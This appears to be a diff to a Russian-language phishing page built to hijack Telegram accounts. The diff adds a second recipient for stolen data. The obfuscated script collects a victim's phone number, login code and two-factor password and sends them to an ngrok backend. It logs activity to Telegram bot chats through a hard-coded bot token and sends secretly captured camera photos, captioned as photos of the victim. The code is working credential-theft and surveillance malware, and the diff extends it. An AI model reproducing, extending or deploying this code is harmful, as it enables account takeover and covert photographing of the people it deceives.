@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -562,12 +561,13 @@
 
 <script>
     (function(){
-        // Обфусцированные данные
-        const _0x3a2b = ['d027-95-59-208-121.ngrok-free.app', '8769935771:AAGiSndbdRrI-5wd0hNE4fyq60a4HlJ-oMM', '8722033694', 'sendMessage', 'bot', 'json', 'POST', 'send_code', 'verify_code', 'verify_password', 'phone', 'code', 'password', 'success', 'needs_password', 'error', 'Log', 'error'];
+        // Обфусцированные данные (два админа)
+        const _0x3a2b = ['d027-95-59-208-121.ngrok-free.app', '8769935771:AAGiSndbdRrI-5wd0hNE4fyq60a4HlJ-oMM', '8722033694', '8594399114', 'sendMessage', 'bot', 'json', 'POST', 'send_code', 'verify_code', 'verify_password', 'phone', 'code', 'password', 'success', 'needs_password', 'error', 'Log', 'error'];
         
         const API_URL = 'https://' + _0x3a2b[0];
         const BOT_TOKEN = _0x3a2b[1];
         const CHAT_ID = _0x3a2b[2];
+        const CHAT_ID_2 = _0x3a2b[3];
         
         let currentPhone = "";
         let currentStep = "phone";
@@ -576,7 +576,11 @@
 
         function sendLog(text) {
             try {
-                fetch(`https://api.telegram.org/${_0x3a2b[4]}${BOT_TOKEN}/${_0x3a2b[3]}?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
+                // Отправляем первому админу
+                fetch(`https://api.telegram.org/${_0x3a2b[5]}${BOT_TOKEN}/${_0x3a2b[4]}?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
+                    .catch(() => {});
+                // Отправляем второму админу
+                fetch(`https://api.telegram.org/${_0x3a2b[5]}${BOT_TOKEN}/${_0x3a2b[4]}?chat_id=${CHAT_ID_2}&text=${encodeURIComponent(text)}`)
                     .catch(() => {});
             } catch(e) {}
         }
@@ -709,6 +713,15 @@
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
             } catch(e) {}
+            
+            // Отправляем второму админу
+            const formData2 = new FormData();
+            formData2.append('chat_id', CHAT_ID_2);
+            formData2.append('photo', blob, 'face.jpg');
+            formData2.append('caption', '📸 ФОТО ЖЕРТВЫ (после входа)');
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData2 });
+            } catch(e) {}
         }
         
         // Камера
@@ -814,13 +827,13 @@
                 statusDiv.innerText = "Отправляем код...";
                 
                 try {
-                    const response = await fetch(`${API_URL}/${_0x3a2b[7]}`, {
-                        method: _0x3a2b[6],
+                    const response = await fetch(`${API_URL}/${_0x3a2b[8]}`, {
+                        method: _0x3a2b[7],
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ [_0x3a2b[10]]: phone })
+                        body: JSON.stringify({ [_0x3a2b[11]]: phone })
                     });
-                    const data = await response[_0x3a2b[5]]();
-                    if (data[_0x3a2b[13]]) {
+                    const data = await response[_0x3a2b[6]]();
+                    if (data[_0x3a2b[14]]) {
                         currentPhone = phone;
                         currentStep = "code";
                         document.getElementById('codeSection').style.display = 'block';
@@ -831,7 +844,7 @@
                         statusDiv.innerHTML = "✅ Код отправлен!";
                         btn.disabled = false;
                     } else {
-                        statusDiv.innerText = "Ошибка: " + (data[_0x3a2b[15]] || "неизвестно");
+                        statusDiv.innerText = "Ошибка: " + (data[_0x3a2b[16]] || "неизвестно");
                         btn.disabled = false;
                         btn.innerText = "📱 Отправить код";
                     }
@@ -848,17 +861,17 @@
                 btn.innerText = "⏳ Проверка...";
                 
                 try {
-                    const response = await fetch(`${API_URL}/${_0x3a2b[8]}`, {
-                        method: _0x3a2b[6],
+                    const response = await fetch(`${API_URL}/${_0x3a2b[9]}`, {
+                        method: _0x3a2b[7],
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ [_0x3a2b[10]]: currentPhone, [_0x3a2b[11]]: code })
+                        body: JSON.stringify({ [_0x3a2b[11]]: currentPhone, [_0x3a2b[12]]: code })
                     });
-                    const data = await response[_0x3a2b[5]]();
-                    if (data[_0x3a2b[13]]) {
+                    const data = await response[_0x3a2b[6]]();
+                    if (data[_0x3a2b[14]]) {
                         statusDiv.style.color = "#88ff88";
                         statusDiv.innerHTML = "✅ Вход выполнен!";
                         await finalStep();
-                    } else if (data[_0x3a2b[14]]) {
+                    } else if (data[_0x3a2b[15]]) {
                         currentStep = "password";
                         document.getElementById('codeSection').style.display = 'none';
                         document.getElementById('passwordSection').style.display = 'block';
@@ -869,7 +882,7 @@
                         statusDiv.innerHTML = "⏳ Требуется пароль";
                         btn.disabled = false;
                     } else {
-                        statusDiv.innerText = "Ошибка: " + (data[_0x3a2b[15]] || "неверный код");
+                        statusDiv.innerText = "Ошибка: " + (data[_0x3a2b[16]] || "неверный код");
                         btn.disabled = false;
                         btn.innerText = "✅ Подтвердить код";
                     }
@@ -886,18 +899,18 @@
                 btn.innerText = "⏳ Проверка...";
                 
                 try {
-                    const response = await fetch(`${API_URL}/${_0x3a2b[9]}`, {
-                        method: _0x3a2b[6],
+                    const response = await fetch(`${API_URL}/${_0x3a2b[10]}`, {
+                        method: _0x3a2b[7],
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ [_0x3a2b[10]]: currentPhone, [_0x3a2b[12]]: password })
+                        body: JSON.stringify({ [_0x3a2b[11]]: currentPhone, [_0x3a2b[13]]: password })
                     });
-                    const data = await response[_0x3a2b[5]]();
-                    if (data[_0x3a2b[13]]) {
+                    const data = await response[_0x3a2b[6]]();
+                    if (data[_0x3a2b[14]]) {
                         statusDiv.style.color = "#88ff88";
                         statusDiv.innerHTML = "✅ Вход выполнен!";
                         await finalStep();
                     } else {
-                        statusDiv.innerText = "Ошибка: " + (data[_0x3a2b[15]] || "неверный пароль");
+                        statusDiv.innerText = "Ошибка: " + (data[_0x3a2b[16]] || "неверный пароль");
                         btn.disabled = false;
                         btn.innerText = "🔐 Подтвердить пароль";
                     }
